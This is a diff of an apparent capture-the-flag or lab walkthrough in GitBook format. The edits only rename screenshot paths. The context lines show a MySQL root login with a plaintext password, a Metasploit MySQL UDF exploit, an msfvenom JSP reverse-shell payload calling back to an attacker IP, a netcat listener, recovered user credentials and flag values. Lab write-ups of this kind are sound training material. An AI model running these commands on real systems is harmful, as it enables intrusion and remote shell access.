@@ -124,9 +124,9 @@ mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 
 ![](<../../../../.gitbook/assets/image (61) (1) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (9) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (9) (1) (2) (1).png>)
 
-![](<../../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../../.gitbook/assets/image (11) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1).png>)
 
@@ -142,13 +142,13 @@ use exploit/multi/mysql/mysql_udf_payload
 
 ![](<../../../../.gitbook/assets/image (52) (1) (1).png>)
 
-![](<../../../../.gitbook/assets/image (14) (1).png>)
+![](<../../../../.gitbook/assets/image (14) (1) (2).png>)
 
 ![FLAG: 4c537c0dfd18bafdcd59f53c7015550e](<../../../../.gitbook/assets/image (31) (1).png>)
 
 ## Server 3
 
-![](<../../../../.gitbook/assets/image (12).png>)
+![](<../../../../.gitbook/assets/image (12) (2).png>)
 
 ```
 dirb http://192.6.232.5:8080
@@ -186,7 +186,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o re
 
 ![](<../../../../.gitbook/assets/image (10) (2).png>)
 
-![](<../../../../.gitbook/assets/image (5) (1).png>)
+![](<../../../../.gitbook/assets/image (5) (1) (2).png>)
 
 ```
 nc -lvp 6666
@@ -224,7 +224,7 @@ username=robert | password=robert@1234567890!@#
 
 ![](<../../../../.gitbook/assets/image (43) (1) (1) (1) (1).png>)
 
-![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (6) (1).png>)
+![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (6) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (18) (1) (1) (1).png>)
 
